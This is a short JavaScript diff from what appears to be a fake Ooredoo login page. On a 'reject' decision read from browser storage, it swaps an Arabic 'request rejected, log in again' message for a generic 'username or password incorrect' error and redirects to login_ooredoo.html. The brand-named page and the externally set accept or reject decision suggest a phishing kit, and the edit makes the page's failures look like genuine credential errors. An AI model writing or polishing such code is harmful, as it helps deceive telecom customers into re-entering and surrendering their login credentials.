@@ -111,7 +111,7 @@
     }
 
     if (decision === 'reject') {
-      sessionStorage.setItem('loginError', 'تم رفض الطلب. يرجى إعادة تسجيل الدخول والمحاولة مرة أخرى.');
+      sessionStorage.setItem('loginError', 'اسم المستخدم أو كلمة المرور غير صحيح');
       localStorage.removeItem('ooredooDecision');
       sessionStorage.removeItem('ooredooDecision');
       window.location.href = 'login_ooredoo.html';
